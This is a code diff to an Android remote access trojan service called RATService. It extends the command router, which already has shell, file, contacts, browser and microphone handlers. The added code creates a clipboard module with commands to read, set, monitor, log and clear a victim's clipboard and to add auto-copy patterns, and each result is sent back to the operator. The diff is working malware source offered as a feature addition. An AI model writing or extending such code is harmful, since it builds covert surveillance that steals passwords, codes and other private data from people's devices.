@@ -144,7 +144,8 @@ public class RATService extends Service {
         if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
         if (Config.ENABLE_FILES) fileModule = new FileModule(this);
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
-    
+    if (Config.ENABLE_CLIPBOARD) clipboardModule = new ClipboardModule(this);
+
         if (Config.ENABLE_BROWSER) browserModule = new BrowserModule(this);
         if (Config.ENABLE_APP_MANAGER) appManagerModule = new AppManagerModule(this);
         deviceModule = new DeviceModule(this);
@@ -801,8 +802,7 @@ case "browser_history":
     } else {
         sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"Invalid package name\"}");
     }
-    break;
-
+    break;                
 case "browser_bookmarks":
     if (browserModule != null && !args.isEmpty()) {
         Log.d(TAG, "🌐 Getting bookmarks for: " + args);
@@ -1394,6 +1394,94 @@ case "configure_mic":
                 }
                 break;
                 
+               // In routeCommand() method, add these cases:
+
+case "clipboard_get":
+    if (clipboardModule != null) {
+        String result = clipboardModule.getClipboardContent();
+        sendCommand("CLIPBOARD_GET|" + result);
+    } else {
+        sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+    }
+    break;
+
+case "clipboard_set":
+    if (clipboardModule != null && args.contains("|")) {
+        String[] parts = args.split("\\|", 2);
+        String text = parts[0];
+        String label = parts.length > 1 ? parts[1] : "Copied from remote";
+        String result = clipboardModule.setClipboardContent(text, label);
+        sendCommand("CLIPBOARD_SET|" + result);
+    } else if (clipboardModule != null) {
+        String result = clipboardModule.setClipboardContent(args, "Copied from remote");
+        sendCommand("CLIPBOARD_SET|" + result);
+    } else {
+        sendCommand("CLIPBOARD_SET|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+    }
+    break;
+
+case "clipboard_history":
+    if (clipboardModule != null) {
+        String result = clipboardModule.getClipboardHistory();
+        sendCommand("CLIPBOARD_HISTORY|" + result);
+    } else {
+        sendCommand("CLIPBOARD_HISTORY|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+    }
+    break;
+
+case "clipboard_monitor_start":
+    if (clipboardModule != null) {
+        String result = clipboardModule.startMonitoring();
+        sendCommand("CLIPBOARD_MONITOR|" + result);
+    } else {
+        sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+    }
+    break;
+
+case "clipboard_monitor_stop":
+    if (clipboardModule != null) {
+        String result = clipboardModule.stopMonitoring();
+        sendCommand("CLIPBOARD_MONITOR|" + result);
+    } else {
+        sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+    }
+    break;
+
+case "clipboard_clear_history":
+    if (clipboardModule != null) {
+        String result = clipboardModule.clearHistory();
+        sendCommand("CLIPBOARD_CLEAR|" + result);
+    } else {
+        sendCommand("CLIPBOARD_CLEAR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+    }
+    break;
+
+case "clipboard_status":
+    if (clipboardModule != null) {
+        String result = clipboardModule.getStatus();
+        sendCommand("CLIPBOARD_STATUS|" + result);
+    } else {
+        sendCommand("CLIPBOARD_STATUS|{\"success\":false,\"error\":\"Clipboard module not available\"}");
+    }
+    break;
+
+case "clipboard_add_pattern":
+    if (clipboardModule != null && !args.isEmpty()) {
+        String result = clipboardModule.addAutoCopyPattern(args);
+        sendCommand("CLIPBOARD_PATTERN|" + result);
+    } else {
+        sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
+    }
+    break;
+
+case "clipboard_remove_pattern":
+    if (clipboardModule != null && !args.isEmpty()) {
+        String result = clipboardModule.removeAutoCopyPattern(args);
+        sendCommand("CLIPBOARD_PATTERN|" + result);
+    } else {
+        sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
+    }
+    break; 
             case "shell":
             case "exec":
                 if (shellModule != null) {
